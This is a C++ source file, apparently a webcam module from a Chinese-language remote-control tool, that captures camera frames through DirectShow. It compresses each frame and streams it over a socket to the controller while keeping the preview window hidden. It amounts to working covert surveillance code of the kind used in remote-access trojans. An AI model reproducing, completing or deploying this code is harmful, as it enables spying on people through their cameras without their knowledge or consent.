/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "stdafx.h"
#include <string>
#include "capturevideo.h"
#include "../../kms/km_head.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#define new DEBUG_NEW
#endif

#pragma   comment(lib,"Strmiids.lib")   
#pragma   comment(lib,"Quartz.lib")

BOOL bOneShot = FALSE ; // 全局变量
extern pshare_main g_share_main;

class SampleGrabberCallback : public ISampleGrabberCB
{
public:
	long iWidth;
	long iHeight;
	pio_socket i_socket;
public:
	SampleGrabberCallback()
	{
	/*	char* s = "c:\\donaldo.bmp";
		strcpy(m_szFileName.c_str() , s);*/
	}

	STDMETHODIMP_(ULONG) AddRef() { return 2; }
	STDMETHODIMP_(ULONG) Release() { return 1; }
	STDMETHODIMP QueryInterface(REFIID riid, void ** ppv)
	{
		if( riid == IID_ISampleGrabberCB || riid == IID_IUnknown )
		{
			*ppv = (void *) static_cast<ISampleGrabberCB*> ( this );
			return NOERROR;
		}
		return E_NOINTERFACE;
	}
	STDMETHODIMP SampleCB( double SampleTime, IMediaSample * pSample ){ return 0 ; }
	STDMETHODIMP BufferCB( double dblSampleTime, BYTE * pBuffer, long lBufferSize )
	{
		if (!pBuffer)
			return E_POINTER;
 
		printf("%s\n", "BufferCB_send");

		p_lzw_dechode p_decode = (p_lzw_dechode)g_share_main->s_func.win32_func[0x16];
		int outlength=i_socket->i_length;
		p_decode((unsigned char*)pBuffer, lBufferSize, (unsigned char*)i_socket->i_buffer, &outlength);

		k_sock_send(i_socket, 4, 0, 0, (char*)i_socket->i_buffer, outlength);

		//SaveBitmap(pBuffer, lBufferSize);
		bOneShot = FALSE;
		return 0;
	}
	BOOL SaveBitmap(BYTE * pBuffer, long lBufferSize )
	{
		HANDLE hf = CreateFile(_T("c:\\donaldo.bmp"), GENERIC_WRITE,FILE_SHARE_READ, NULL,CREATE_ALWAYS, NULL, NULL);
		if( hf == INVALID_HANDLE_VALUE )
			return 0;

		BITMAPFILEHEADER bfh;
		memset( &bfh, 0, sizeof( bfh ));
		bfh.bfType = 'MB';
		bfh.bfSize = sizeof(bfh) + lBufferSize + sizeof( BITMAPINFOHEADER );
		bfh.bfOffBits = sizeof( BITMAPINFOHEADER ) + sizeof( BITMAPFILEHEADER );
		DWORD dwWritten = 0;
		WriteFile( hf, &bfh, sizeof(bfh), &dwWritten, NULL);
		//写位图格式
		BITMAPINFOHEADER bih;
		memset( &bih, 0, sizeof( bih ));
		bih.biSize = sizeof(bih);
		bih.biWidth = iWidth;
		bih.biHeight = iHeight;
		bih.biPlanes = 1;
		bih.biBitCount = 24;
		WriteFile( hf, &bih, sizeof( bih ), &dwWritten, NULL);
		WriteFile( hf, pBuffer, lBufferSize, &dwWritten, NULL);
		CloseHandle( hf );

	/*	HDC hdc = GetDC(hWnd);

        StretchDIBits(hdc, 0, 0,
                            iWidth, iHeight,
            0,0,
            iWidth,
            iHeight,
            pBuffer,
            (LPBITMAPINFO)&bih, DIB_RGB_COLORS, SRCCOPY);
        ReleaseDC(hWnd, hdc);*/
		return 0;
	}
};

SampleGrabberCallback mCB;
CCaptureVideo::CCaptureVideo()
{
	if(FAILED(CoInitialize(NULL)))
	{
		//AfxMessageBox("CoInitialize Failed!\r\n");
		return ;
	}
	m_hWnd = NULL;
	m_pVW  = NULL;
	m_pMC  = NULL;
	m_pGB  = NULL;
	m_pCapture = NULL;
}

CCaptureVideo::~CCaptureVideo()
{
	if(m_pMC)
		m_pMC->Stop();
	if(m_pVW)
	{
		m_pVW->put_Visible(OAFALSE);
		m_pVW->put_Owner(NULL);
	}
	m_pCapture.Release();
	m_pMC.Release();
	m_pGB.Release();

	if(m_pBF)
		m_pBF.Release();

	m_pGrabber.Release();

	CoUninitialize();
}

//枚举视频设备
int CCaptureVideo::EnumDevices(char *buffer)
{
	int id = 0;
	char str[2048];
	ICreateDevEnum* pCreateDevEnum;

	CoInitialize(NULL);

	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,NULL, CLSCTX_INPROC_SERVER,IID_ICreateDevEnum,(void**)&pCreateDevEnum);

	if (hr != NOERROR) {
		printf("EnumDevices CoCreateInstance :%d:%x\n", GetLastError(), hr);
		return -1;
	}
	CComPtr<IEnumMoniker> pEm;
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEm, 0);
	if ( hr != NOERROR ) {
		printf("EnumDevices CreateClassEnumerator :%d:%x\n", GetLastError(), hr);
		return -1;
	}
	pEm->Reset();
	ULONG cFetched;
	IMoniker* pM;
	while( hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)
	{
		IPropertyBag* pBag;
		hr = pM->BindToStorage( 0, 0, IID_IPropertyBag, (void**)&pBag);
		if(SUCCEEDED(hr))
		{
			VARIANT var;
			VariantInit(&var);
			var.vt = VT_BSTR;
			hr = pBag->Read(L"FriendlyName",&var, NULL);
			if (hr == NOERROR)
			{
				id++;
				WideCharToMultiByte(CP_ACP,0,var.bstrVal, -1,(LPSTR)str,2048, NULL,NULL);
				strcat(buffer, str);
				strcat(buffer, "|");
				SysFreeString(var.bstrVal);
			}
			pBag->Release();
		}
		pM->Release();
	}
	return id;
}

HRESULT CCaptureVideo::Init(int iDeviceID, pio_socket i_socket, HWND hWnd, HWND hRoot,int width, int heigth)
{
	HRESULT hr;

	CoInitialize(NULL);

	hr = InitCaptureGraphBuilder();
	if(FAILED(hr))
	{
		printf("error1\n");
		return hr;
	}
	if(!BindFilter(iDeviceID, &m_pBF))
		return S_FALSE;
	hr = m_pGB->AddFilter(m_pBF,L"Capture Filter");
	hr = m_pGrabber.CoCreateInstance( CLSID_SampleGrabber );
	if( !m_pGrabber)
	{
		printf("error2\n");
		return hr;
	}
	CComQIPtr< IBaseFilter, &IID_IBaseFilter> pGrabBase(m_pGrabber);

	AM_MEDIA_TYPE mtGroup;
	ZeroMemory(&mtGroup,sizeof(AM_MEDIA_TYPE));
	mtGroup.majortype = MEDIATYPE_Video;
	mtGroup.subtype = MEDIASUBTYPE_RGB24;

	mtGroup.pbFormat = (BYTE*)CoTaskMemAlloc(sizeof(VIDEOINFOHEADER));
	if (mtGroup.pbFormat == NULL)
	{
		printf("error3\n");
		return E_OUTOFMEMORY;
	}

	VIDEOINFOHEADER *pVideoHeader = (VIDEOINFOHEADER*)mtGroup.pbFormat;
	ZeroMemory(pVideoHeader,sizeof(VIDEOINFOHEADER));
	pVideoHeader->bmiHeader.biSize            = sizeof(VIDEOINFOHEADER);
	pVideoHeader->bmiHeader.biCompression     = BI_RGB;
	pVideoHeader->bmiHeader.biBitCount        = 24;
	pVideoHeader->bmiHeader.biWidth           = width;
	pVideoHeader->bmiHeader.biHeight          = heigth;
	pVideoHeader->bmiHeader.biPlanes          = 1;
	pVideoHeader->bmiHeader.biSizeImage       = 0;
	pVideoHeader->bmiHeader.biXPelsPerMeter   = 0;
	pVideoHeader->bmiHeader.biYPelsPerMeter   = 0;
	pVideoHeader->bmiHeader.biClrUsed         = 0;
	pVideoHeader->bmiHeader.biClrImportant    = 0;

	mtGroup.formattype = FORMAT_VideoInfo;
	mtGroup.cbFormat   = sizeof(VIDEOINFOHEADER);

	mtGroup.bFixedSizeSamples = TRUE;
	mtGroup.lSampleSize = DIBSIZE(pVideoHeader->bmiHeader);

	hr = m_pGrabber->SetMediaType(&mtGroup);

	CoTaskMemFree(mtGroup.pbFormat); 

	if (FAILED(hr)) {
		printf("error4\n");
		return hr;
	}

	hr = m_pGB->AddFilter(pGrabBase, L"Grabber");
	if ( FAILED(hr)) {
		printf("error5\n");
		return hr;
	}

	hr = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW, &MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
	if ( FAILED( hr ))
		hr = m_pCapture->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, m_pBF, pGrabBase,NULL);
	if ( FAILED(hr)) {
		printf("error6\n");
		return hr;
	}

	hr = m_pGrabber ->GetConnectedMediaType( &mtGroup );
	if (FAILED(hr)) {
		printf("error7\n");
		return hr;
	}
	
	VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)mtGroup.pbFormat;
	mCB.iWidth = vih->bmiHeader.biWidth;
	mCB.iHeight = vih->bmiHeader.biHeight;
	mCB.i_socket = i_socket;

	FreeMediaType(mtGroup);

	hr = m_pGrabber->SetBufferSamples( FALSE );
	hr = m_pGrabber ->SetOneShot(FALSE);
	hr = m_pGrabber ->SetCallback( &mCB, 1);  //0 = Use the SampleCB callback  1 = BufferCB

	//Sample Grabber工作包含两种模式：
    //A、 在将采样向下传送之前产生每个采样的拷贝，然后放到其缓冲。SetBufferSamples(TRUE) SetOneShot(TRUE)
    //B、 以回调方式进行处理数据，回调由应用程序定义。

	//设置捕捉窗口
	m_hWnd = hWnd;
	SetupVideoWindow();
	hr = m_pMC->Run(); //开始视频捕捉
	if(FAILED(hr))
	{
		printf("error8\n");
		//::AfxMessageBox(_T("Couldn't run the graph!"));
		return hr;
	}
	return S_OK;
}

bool CCaptureVideo::BindFilter(int deviceId, IBaseFilter** pFilter)
{
	if( deviceId < 0 )
		return false;

	CComPtr<ICreateDevEnum> pCreateDevEnum;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
		IID_ICreateDevEnum, (void**)&pCreateDevEnum);
	if (hr != NOERROR)
	{
		return false;
	}

	CComPtr<IEnumMoniker> pEm;

	//创建一个枚举器，枚举视频设备
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	if(hr != NOERROR)
	{
		return false;
	}
	pEm->Reset();

	ULONG cFetched;
	IMoniker* pM;
	int index = 0;
	while(hr = pEm->Next(1, &pM, &cFetched), hr == S_OK, index <= deviceId)
	{
		IPropertyBag* pBag;
		hr = pM->BindToStorage(0,0,IID_IPropertyBag, (void**)&pBag);
		if(SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;
			hr = pBag->Read(L"FriendlyName",&var,NULL);
			if(hr == NOERROR)
			{
				if(index == deviceId)
				{
					pM->BindToObject(0,0,IID_IBaseFilter,(void**)pFilter);
				}
				SysFreeString(var.bstrVal);
			}
			pBag->Release();
		}
		pM->Release();
		index++;
	}
	return true;
}


HRESULT CCaptureVideo::InitCaptureGraphBuilder()
{
	HRESULT hr;
	// 创建IGraphBuilder接口
	hr = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&m_pGB);
	if (FAILED(hr)) {
		printf("CoCreateInstance CLSID_FilterGraph :%d:%x\n", GetLastError(), hr);
		return hr;
	}
	// 创建ICaptureGraphBuilder2接口
	hr = CoCreateInstance(CLSID_CaptureGraphBuilder2 , NULL, CLSCTX_INPROC, IID_ICaptureGraphBuilder2, (void**)&m_pCapture );
	if (FAILED(hr)) {
		printf("CoCreateInstance CLSID_CaptureGraphBuilder2 :%d:%x\n", GetLastError(), hr);
		return hr;
	}

	m_pCapture->SetFiltergraph(m_pGB);
	hr = m_pGB->QueryInterface(IID_IMediaControl,(void**)&m_pMC);
	if (FAILED(hr)) {
		printf("CoCreateInstance IID_IMediaControl  :%d:%x\n", GetLastError(), hr);
		return hr;
	}

	hr = m_pGB->QueryInterface(IID_IVideoWindow,(LPVOID*)&m_pVW);
	if (FAILED(hr)) {
		printf("CoCreateInstance IID_IVideoWindow  :%d:%x\n", GetLastError(), hr);
		return hr;
	}

	return hr;
}

HRESULT CCaptureVideo::SetupVideoWindow()
{
	HRESULT hr;
	hr = m_pVW->put_Owner((OAHWND)m_hWnd);
	if(FAILED(hr))
		return hr;
	hr = m_pVW->put_WindowStyle( WS_VISIBLE | WS_CHILD | WS_CLIPCHILDREN);
	if (FAILED(hr))
		return hr;

	ResizeVideoWindow();
	hr = m_pVW->put_Visible(OAFALSE);
	hr = m_pVW->put_AutoShow(FALSE);
	return hr;
}

void CCaptureVideo::ResizeVideoWindow()
{
	if (m_pVW)
	{
		//CRect rc;
		//::GetClientRect(m_hWnd, &rc);
		//m_pVW->SetWindowPosition(0,0, rc.right, rc.bottom);
	}
}

void CCaptureVideo::GrabOneFrame(BOOL bGrab)
{
	bOneShot = bGrab;
}


void CCaptureVideo::FreeMediaType(AM_MEDIA_TYPE& mt)
{
	if (mt.cbFormat != 0)
	{
		CoTaskMemFree((PVOID)mt.pbFormat);
		mt.cbFormat = 0;
		mt.pbFormat = NULL;
	}
	if (mt.pUnk != NULL)
	{
		mt.pUnk->Release();
		mt.pUnk = NULL;
	}
}


void CCaptureVideo::stop()
{
	if (m_pMC)
		m_pMC->Stop();
	if (m_pVW){
		m_pVW->put_Visible(OAFALSE);
		m_pVW->put_Owner(NULL);
		m_pVW.Release();
	}
	m_pBF.Release();
	m_pCapture.Release();
	m_pMC.Release();
	m_pGB.Release();
	if (m_pBF)
		m_pBF.Release();
	m_pGrabber.Release();

	//CoUninitialize();
}